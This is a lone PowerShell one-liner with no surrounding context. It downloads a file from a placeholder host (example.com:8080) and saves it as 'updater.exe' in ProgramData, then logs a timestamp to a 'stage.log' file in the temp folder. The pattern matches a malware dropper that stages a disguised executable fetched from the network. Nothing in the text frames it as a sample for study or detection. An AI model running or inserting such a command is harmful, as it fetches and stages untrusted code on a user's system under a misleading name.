
(New-Object System.Net.WebClient).DownloadFile('http://example.com:8080/update.dat', 'C:\ProgramData\updater.exe'); Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
